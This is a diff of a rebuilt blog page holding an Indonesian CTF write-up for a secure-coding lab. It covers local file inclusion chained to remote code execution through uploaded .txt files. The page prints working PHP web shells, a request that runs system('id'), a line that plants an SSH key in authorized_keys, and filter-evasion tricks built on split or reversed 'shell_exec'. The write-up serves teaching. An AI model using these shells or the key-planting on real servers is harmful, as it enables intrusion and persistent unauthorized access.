@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html class="no-js" lang="en">
+<html class="no-js" lang="id-ID">
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
@@ -14,16 +14,18 @@
 <meta property="article:published_time" content="2019-05-09T00:00:00+00:00" />
 <meta property="article:modified_time" content="2019-05-09T00:00:00+00:00" />
 
-
 		<meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Solution for Ramadhan Challenges"/>
 <meta name="twitter:description" content="Challenges ini dibuat ketika bingung mau menjelaskan bug LFI (Local File Inclusion) pada saat secure coding di STTS, karena cukup bosan dengan LFI to Local File Read via wrapper, saya mencari LFI to RCE selain melalui /self/proc/environ dan menemukan LFI to RCE via Access Log Posioning, namun karena di hosting tidak bisa baca log berbentuk txt maka terbuatlah fitur file upload yang hanya bisa upload txt. dan berikut adalah Write Up-nya."/>
 
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 	<link rel="dns-prefetch" href="//fonts.googleapis.com">
 	<link rel="dns-prefetch" href="//fonts.gstatic.com">
 	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
 	<link rel="stylesheet" href="/css/style.css">
 	<link rel="stylesheet" href="/css/custom.css">
+
 	<link rel="shortcut icon" href="/favicon.ico">
 		
 <script type="application/javascript">
@@ -37,7 +39,7 @@ if (!doNotTrack) {
 </script>
 <script async src='https://www.google-analytics.com/analytics.js'></script>
 
-	<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1926937123072670" crossorigin="anonymous"></script>
+    <script data-ad-client="ca-pub-1926937123072670" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 </head>
 <body class="body">
 	<div id="loading"></div>
@@ -96,15 +98,16 @@ if (!doNotTrack) {
 	</span>
 </div></div>
 		</header>
-		<figure class="post__thumbnail">
-			<img src="/img/ramadhan/0.webp" alt="Solution for Ramadhan Challenges">
-		</figure><div class="content post__content clearfix">
-			<p>Challenges ini dibuat ketika bingung mau menjelaskan bug LFI (Local File Inclusion) pada saat secure coding di <a href="https://stts.edu">STTS</a>, karena cukup bosan dengan LFI to Local File Read via wrapper, saya mencari LFI to RCE selain melalui <code>/self/proc/environ</code> dan menemukan LFI to RCE via Access Log Posioning, namun karena di hosting tidak bisa baca log berbentuk txt maka terbuatlah fitur file upload yang hanya bisa upload txt. dan berikut adalah Write Up-nya.<br>
-<!-- raw HTML omitted --><br>
-<img src="/img/ramadhan/1.webp" alt="tampilan awal"><br>
-Di atas adalah tampilan ketika membaca lorem ipsum, terlihat pada url ada parameter / index page dengan value loremipusm.html, hal ini pun berlaku ketika membaca twice<br>
-<!-- raw HTML omitted --><br>
-<img src="/img/ramadhan/2.webp" alt="membaca /etc/passwd"><br>
+		
+	<figure class="post__thumbnail thumbnail">
+		
+		<img class="thumbnail__image" src="/img/ramadhan/0.webp" alt="Solution for Ramadhan Challenges">
+		
+	</figure><div class="content post__content clearfix">
+			<p>Challenges ini dibuat ketika bingung mau menjelaskan bug LFI (Local File Inclusion) pada saat secure coding di <a href="https://stts.edu">STTS</a>, karena cukup bosan dengan LFI to Local File Read via wrapper, saya mencari LFI to RCE selain melalui <code>/self/proc/environ</code> dan menemukan LFI to RCE via Access Log Posioning, namun karena di hosting tidak bisa baca log berbentuk txt maka terbuatlah fitur file upload yang hanya bisa upload txt. dan berikut adalah Write Up-nya.</p>
+<p><img src="/img/ramadhan/1.webp" alt="tampilan awal"><br>
+Di atas adalah tampilan ketika membaca lorem ipsum, terlihat pada url ada parameter / index page dengan value loremipusm.html, hal ini pun berlaku ketika membaca twice</p>
+<p><img src="/img/ramadhan/2.webp" alt="membaca /etc/passwd"><br>
 Kita coba langsung untuk membaca file /etc/passwd, dan berhasil. Terlihat jelas bahwa value parameter page langsung di include, kurang lebih source code seperti ini</p>
 <pre tabindex="0"><code>&lt;?php
 ...
@@ -112,13 +115,11 @@ if($_GET[&#39;page&#39;]) {
 	include(&#34;article/&#34;.$_GET[&#39;page&#39;]);
 } else
 ...
-</code></pre><p>Terlihat dari error message ketika merubah value dari index page ke value yang tidak valid, setelah mencoba banyak cara untuk mendapatkan akses seperti RFI (Remote File Inclusion), Wrapper dan lain sebagainya, hasilnya gagal total, hal ini gagal karena ada kata &lsquo;article&rsquo; di depan sebelum input parameter page, yang menyebabkan tidak bisa melakukan RFI dan wrapper <br>
-<!-- raw HTML omitted --><br>
-<img src="/img/ramadhan/3.webp" alt="isi dari robots.txt"><br>
-Membuka terminal dan melakukan pencarian folder lain menggunakan gobuster dan wordlist common web files, dan menemukan files robots.txt dan directory uploads, pada file robots.txt terdapat Disallow: uploads/, kita langsung ke diretory tersebut dan mendapatkan form upload<br>
-<!-- raw HTML omitted --><br>
-<img src="/img/ramadhan/4.webp" alt="file too big"><br>
-Lansung aja mengupload webshell php, namun gagal karena file terlalu besar</p>
+</code></pre><p>Terlihat dari error message ketika merubah value dari index page ke value yang tidak valid, setelah mencoba banyak cara untuk mendapatkan akses seperti RFI (Remote File Inclusion), Wrapper dan lain sebagainya, hasilnya gagal total, hal ini gagal karena ada kata &lsquo;article&rsquo; di depan sebelum input parameter page, yang menyebabkan tidak bisa melakukan RFI dan wrapper</p>
+<p><img src="/img/ramadhan/3.webp" alt="isi dari robots.txt"><br>
+Membuka terminal dan melakukan pencarian folder lain menggunakan gobuster dan wordlist common web files, dan menemukan files robots.txt dan directory uploads, pada file robots.txt terdapat Disallow: uploads/, kita langsung ke diretory tersebut dan mendapatkan form upload</p>
+<p><img src="/img/ramadhan/4.webp" alt="file too big"><br>
+Langsung aja mengupload webshell php, namun gagal karena file terlalu besar</p>
 <p><img src="/img/ramadhan/5.webp" alt="php one line web shell"><br>
 Ganti ke one liner php web shell, biar file size makin kecil</p>
 <p><img src="/img/ramadhan/10.webp" alt="file name alredy exist"><br>
@@ -147,24 +148,20 @@ Write nick to solver.txt <code>echo &quot;nick&quot; &gt;&gt; solver.txt</code><
 Nick tertulis :3</p>
 <p>Namun ketika challenges ini dikerjakan oleh teman-teman yang ada pada group SHL, cukup menarik, karena banyak yang tidak menggunakan <code>`</code> untuk menulis nick, ada yang melalui command php files, dan beberapa trik evasion agar file txt tidak terdeteksi sebagai malware/virus ketika di upload seperti berikut</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?=@</span>$_GET[<span style="color:#a6e22e">a</span>]($_GET[<span style="color:#a6e22e">b</span>])<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>@ pada kode di atas untuk menonaktifkan display error yang akan muncul, kemudian ada 2 index / parameter yaitu a dan b yang dimana index / param b berada di dalam kurung setelah index /param a sehingga player melakukan request <code>https://challshl/?page=../uploads/x.txt&amp;a=system&amp;b=id</code> maka fungsi system akan terpanggil karena dengan request tersebut maka sama saja dengan <code>&lt;?php system('id') ?&gt;</code> karena pada server fungsi shell tidak dimatikan melalui php.ini<br>
-<!-- raw HTML omitted --></p>
+</span></span></span></code></pre></div><p>@ pada kode di atas untuk menonaktifkan display error yang akan muncul, kemudian ada 2 index / parameter yaitu a dan b yang dimana index / param b berada di dalam kurung setelah index /param a sehingga player melakukan request <code>https://challshl/?page=../uploads/x.txt&amp;a=system&amp;b=id</code> maka fungsi system akan terpanggil karena dengan request tersebut maka sama saja dengan <code>&lt;?php system('id') ?&gt;</code> karena pada server fungsi shell tidak dimatikan melalui php.ini</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?=</span><span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;/home/challshl/.ssh/authorized_keys&#39;</span>, <span style="color:#e6db74">&#39;ssh-rsa AAxa---snip---DDyt user@host&#39;</span>)<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><p>Menggunakan fungsi file_put_contents() untuk memasukan public key ke dalam authorized_keys di folder .ssh<br>
-Dengan begini player mendapatkan akses shell melalui ssh tanpa harus login karena public key sudah tersimpan pada server<br>
-<!-- raw HTML omitted --></p>
+Dengan begini player mendapatkan akses shell melalui ssh tanpa harus login karena public key sudah tersimpan pada server</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?=</span>
 </span></span><span style="display:flex;"><span>$func <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sh&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;ell&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;ex&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;ec&#34;</span>; 
 </span></span><span style="display:flex;"><span>$ups <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;ups&#39;</span>];
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span> <span style="color:#f92672">.</span> $func($ups) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span>;
-</span></span></code></pre></div><p>Kode di atas menggunakan fungsi shell_exec() yang dimana fungsi tersebut telah di block (check source code at <a href="https://github.com/laztname/notAcms/">here</a>) namun tetap bisa digunakan karena tidak ada pengecekan kata sh, ell, ex, ec kata tersebut dipisah namun disatukan kembali sehingga dapat menggunakan fungsi shell_exec()<br>
-<!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>Kode di atas menggunakan fungsi shell_exec() yang dimana fungsi tersebut telah di block (check source code at <a href="https://github.com/laztname/notAcms/">here</a>) namun tetap bisa digunakan karena tidak ada pengecekan kata sh, ell, ex, ec kata tersebut dipisah namun disatukan kembali sehingga dapat menggunakan fungsi shell_exec()</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?=</span> 
 </span></span><span style="display:flex;"><span>$shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cexe_llehs&#34;</span>;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span>(<span style="color:#a6e22e">strrev</span>($shell($_GET[<span style="color:#e6db74">&#39;x&#39;</span>])));
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>Kode di atas sangat sederhana, hanya membalik kata shell_exec menjadi cexe_llehs, karena kata tersebut tidak diblacklist maka file tetap terupload, tapi pada kode tersebut menggunakan fungsi strrev() dimana fungsi tersebut membalikan urutan kata, sehingga player dapat menjalankan fungsi shell_exec()<br>
-<!-- raw HTML omitted --></p>
+</span></span></span></code></pre></div><p>Kode di atas sangat sederhana, hanya membalik kata shell_exec menjadi cexe_llehs, karena kata tersebut tidak diblacklist maka file tetap terupload, tapi pada kode tersebut menggunakan fungsi strrev() dimana fungsi tersebut membalikan urutan kata, sehingga player dapat menjalankan fungsi shell_exec()</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?=</span> 
 </span></span><span style="display:flex;"><span>$cmd <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;x&#39;</span>];
 </span></span><span style="display:flex;"><span>$shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;szhezlzl_ezxezc&#34;</span>;
@@ -212,7 +209,7 @@ dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat m
 		<img alt="Ardi Jonias Fortuna avatar" src="/img/avatar.webp" class="avatar" height="90" width="90">
 	</figure>
 	<div class="authorbox__header">
-		<span class="authorbox__name">About Ardi Jonias Fortuna</span>
+		<span class="authorbox__name">About map[Name:Ardi Jonias Fortuna]</span>
 	</div>
 	<div class="authorbox__description">
 		Roses are red, violets are blue. There is nothing can&rsquo;t to do
@@ -233,10 +230,13 @@ dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat m
 		</a>
 	</div>
 </nav>
-
-
-<section class="comments">
-	<div id="disqus_thread"></div>
+<div id="disqus-container">
+  
+  
+    <button id="disqus-button" onclick="showComments()">Show comments</button>
+    <div id="disqus-comments">
+      
+        <div id="disqus_thread"></div>
 <script type="application/javascript">
     window.disqus_config = function () {
     
@@ -256,17 +256,19 @@ dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat m
 </script>
 <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 <a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-</section>
-
+      
+    </div>
+  
+</div>
 
 			</div>
 			<aside class="sidebar sidebar--left"><div class="widget-search widget">
 	<form class="widget-search__form" role="search" method="get" action="https://google.com/search">
 		<label>
-			<input class="widget-search__field" type="search" placeholder="SEARCH..." value="" name="q" aria-label="SEARCH...">
+			<input class="widget-search__field" type="search" placeholder="SEARCH…" value="" name="q" aria-label="SEARCH…">
 		</label>
 		<input class="widget-search__submit" type="submit" value="Search">
-		<input type="hidden" name="sitesearch" value="https://potato.id/" />
+		<input type="hidden" name="sitesearch" value="https://potato.id/">
 	</form>
 </div><div class="widget-recent widget">
 	<h4 class="widget__title">Information</h4>
@@ -281,11 +283,11 @@ dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat m
 	<h4 class="widget__title">Recent Posts</h4>
 	<div class="widget__content">
 		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/posts/lesson-learned-from-ransomware/">Lesson Learned from Ransomware</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/it-was-dns/">Yes, It was DNS!</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/bash-job-management-and-shortcut/">Manajemen Job dan Shortcut pada Terminal</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/retas-io-hellbound-vm-write-up/">Retas.io Hellbound VM Write-up</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/retas-io-zombie-vm-write-up/">Retas.io Zombie VM Write-up</a></li>
-			<li class="widget__item"><a class="widget__link" href="/posts/solution-for-mhl-challenges/">Penyelesaian Challenges Malang Hacker Link</a></li>
 		</ul>
 	</div>
 </div>
@@ -294,20 +296,15 @@ dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat m
 	<div class="widget__content">
 		<ul class="widget__list">
 			<li class="widget__item">
-				<a class="widget__link" href="/categories/defensive/">Defensive</a>
-			</li>
+				<a class="widget__link" href="/categories/defensive/">Defensive</a></li>
 			<li class="widget__item">
-				<a class="widget__link" href="/categories/development/">Development</a>
-			</li>
+				<a class="widget__link" href="/categories/development/">Development</a></li>
 			<li class="widget__item">
-				<a class="widget__link" href="/categories/offensive/">Offensive</a>
-			</li>
+				<a class="widget__link" href="/categories/offensive/">Offensive</a></li>
 			<li class="widget__item">
-				<a class="widget__link" href="/categories/reversing/">Reversing</a>
-			</li>
+				<a class="widget__link" href="/categories/reversing/">Reversing</a></li>
 			<li class="widget__item">
-				<a class="widget__link" href="/categories/web-hacking/">Web Hacking</a>
-			</li>
+				<a class="widget__link" href="/categories/web-hacking/">Web Hacking</a></li>
 		</ul>
 	</div>
 </div>
@@ -334,12 +331,11 @@ dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat m
 		<a class="widget-taglist__link widget__link btn" href="/tags/terminal/" title="Terminal">Terminal (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/virtual-machine/" title="Virtual Machine">Virtual Machine (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/wordpress/" title="Wordpress">Wordpress (1)</a>
-		<a class="widget-taglist__link widget__link btn" href="/tags/write-up/" title="Write Up">Write Up (10)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/write-up/" title="Write Up">Write Up (11)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/xss/" title="XSS">XSS (3)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/zimbra-mail-server/" title="Zimbra mail server">Zimbra mail server (1)</a>
 	</div>
 </div>
-
 <div class="widget-social widget">
 	<h4 class="widget-social__title widget__title">Social</h4>
 	<div class="widget-social__content widget__content">
@@ -383,7 +379,7 @@ dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat m
 	<div class="container footer__container flex">
 		
 		<div class="footer__copyright">
-			&copy; 2022 Ardi Jonias Fortuna.
+			&copy; 2023 Ardi Jonias Fortuna.
 			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
 		</div>
 	</div>
